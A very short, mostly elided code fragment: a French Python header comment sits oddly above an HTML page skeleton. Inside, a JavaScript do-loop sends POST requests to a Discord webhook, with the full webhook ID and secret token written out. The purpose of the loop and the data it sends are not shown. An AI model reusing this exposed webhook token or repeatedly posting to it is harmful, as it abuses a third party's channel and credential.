# Créé par Nathan, le 10/01/2024 en Python 3.7
<head>
...
<body>
  ...
  do {
    ...
    request.open("POST", "https://discord.com/api/webhooks/1220120263899873300/S7TCLc_N2-2KmJ8EkmiWN9K4AQzggQhc4rSUqXP34d0AA1B0yEmXX7eY79-5FWIB9akf");
